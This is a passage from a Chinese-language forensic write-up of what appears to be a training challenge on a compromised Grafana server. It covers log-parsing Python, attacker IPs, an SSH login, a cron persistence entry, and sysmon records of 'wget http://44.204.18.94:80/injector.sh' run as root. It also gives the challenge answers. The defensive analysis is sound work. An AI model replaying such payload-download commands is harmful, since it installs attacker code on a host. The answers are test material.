style="color:#393A34"><span class="token plain">194.32.122.58      1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">71.6.232.20        1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">193.118.53.210     2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">198.235.24.155     2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">78.146.160.14      1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">205.210.31.132     1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">205.210.31.51      2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">44.192.62.21       1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">89.247.167.246     13</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">95.181.232.32      25</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">195.80.150.137     22</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div></details>
<p>再使用脚本，对登陆失败的记录进行筛选</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ips </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> index </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">18</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">25</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./grafana.log.2022-11-{}.001&quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">index</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;r&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        log_data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    log_data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> log_data</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;\n&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> log_data</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;86.5.206.121&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;remote_addr&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Invalid username or password&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            info_1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;&quot;&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            info_2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> info_1</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">startswith</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;remote_addr&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">info_1</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">info_2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ip </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">startswith</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;remote_addr&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;=&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> ip </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> ips</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">keys</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                ips</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">ip</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                ips</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">ip</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> ips</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">keys</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">18</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ips</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>得到以下 ip 的集合</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">86.24.61.7         11</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">86.31.99.194       1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">95.181.232.32      1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>同时，对 <code>syslog</code> 文件进行分析，查找其中可能存在的攻击行为，发现以下 ip</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">44.204.18.94</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>最终整合上面分析出来的信息，得到最终答案</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Answer</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">44.204.18.94,95.181.232.32,195.80.150.137</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="#task-3" class="hash-link" aria-label="Task 3的直接链接" title="Task 3的直接链接">​</a></h2>
<blockquote>
<p>TA 使用哪个账户进行身份验证以访问主机操作系统？</p>
</blockquote>
<p>将 <code>.\catscale_out\Logs\ip-172-31-13-147-20221124-1501-var-log.tar.gz</code> 文件进行解压缩，在其中找到 <code>auth.log</code> 这个文件，其中所记录的是系统的鉴权日志，在 sshd 部分就可以看到相关鉴权日志</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">auth.log</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Nov 23 11:17:18 ip-172-31-60-25 sshd[6105]: Accepted password for grafana from 195.80.150.137 port 52172 ssh2&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Answer</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">grafana</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="#task-4" class="hash-link" aria-label="Task 4的直接链接" title="Task 4的直接链接">​</a></h2>
<blockquote>
<p>TA 修改了哪个文件以提升权限并以 &quot;root&quot; 身份运行挖矿服务？</p>
</blockquote>
<p>查看 <code>Persistence\ip-172-31-13-147-20221124-1501-cron-tab-list.txt</code> 文件，得到以下信息</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">30 8 * * * /opt/automation/updater.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ENDOFUSERCRON</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">no crontab for ubuntu</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ENDOFUSERCRON</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grafana</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">no crontab for grafana</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ENDOFUSERCRON</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">itadmin-forela</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">no crontab for itadmin-forela</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ENDOFUSERCRON</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Answer</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/opt/automation/updater.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-5">Task 5<a href="#task-5" class="hash-link" aria-label="Task 5的直接链接" title="Task 5的直接链接">​</a></h2>
<blockquote>
<p>TA 使用哪个程序下载了 injector.sh 脚本？</p>
</blockquote>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌─[randark@parrot]─[~/tmp/var/log]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└──╼ $ cat syslog | grep &quot;injector.sh&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 08:30:01 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;1&lt;/EventID&gt;&lt;Version&gt;5&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;1&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T08:30:01.467399000Z&quot;/&gt;&lt;EventRecordID&gt;75097&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 08:30:01.467&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-2b89-637f-700c-0807f5550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;3372&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/bin/wget&lt;/Data&gt;&lt;Data Name=&quot;FileVersion&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Description&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Product&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Company&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;OriginalFileName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;CommandLine&quot;&gt;wget http://44.204.18.94:80/injector.sh&lt;/Data&gt;&lt;Data Name=&quot;CurrentDirectory&quot;&gt;/root&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;Data Name=&quot;LogonGuid&quot;&gt;{c9eb4a87-0000-0000-0000-000000000000}&lt;/Data&gt;&lt;Data Name=&quot;LogonId&quot;&gt;0&lt;/Data&gt;&lt;Data Name=&quot;TerminalSessionId&quot;&gt;64&lt;/Data&gt;&lt;Data Name=&quot;IntegrityLevel&quot;&gt;no level&lt;/Data&gt;&lt;Data Name=&quot;Hashes&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessGuid&quot;&gt;{c9eb4a87-2b89-637f-4894-b7e93f560000}&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessId&quot;&gt;3371&lt;/Data&gt;&lt;Data Name=&quot;ParentImage&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentCommandLine&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentUser&quot;&gt;root&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:55:35 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;1&lt;/EventID&gt;&lt;Version&gt;5&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;1&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T09:55:35.396996000Z&quot;/&gt;&lt;EventRecordID&gt;76910&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:55:35.401&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-3f97-637f-70dc-b5d3e3550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;3992&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/bin/wget&lt;/Data&gt;&lt;Data Name=&quot;FileVersion&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Description&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Product&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Company&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;OriginalFileName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;CommandLine&quot;&gt;wget http://44.204.18.94:80/injector.sh&lt;/Data&gt;&lt;Data Name=&quot;CurrentDirectory&quot;&gt;/opt/automation&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;Data Name=&quot;LogonGuid&quot;&gt;{c9eb4a87-0000-0000-0000-000001000000}&lt;/Data&gt;&lt;Data Name=&quot;LogonId&quot;&gt;0&lt;/Data&gt;&lt;Data Name=&quot;TerminalSessionId&quot;&gt;66&lt;/Data&gt;&lt;Data Name=&quot;IntegrityLevel&quot;&gt;no level&lt;/Data&gt;&lt;Data Name=&quot;Hashes&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessGuid&quot;&gt;{c9eb4a87-3f97-637f-4864-74f766550000}&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessId&quot;&gt;3991&lt;/Data&gt;&lt;Data Name=&quot;ParentImage&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentCommandLine&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentUser&quot;&gt;root&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:47 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;1&lt;/EventID&gt;&lt;Version&gt;5&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;1&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated 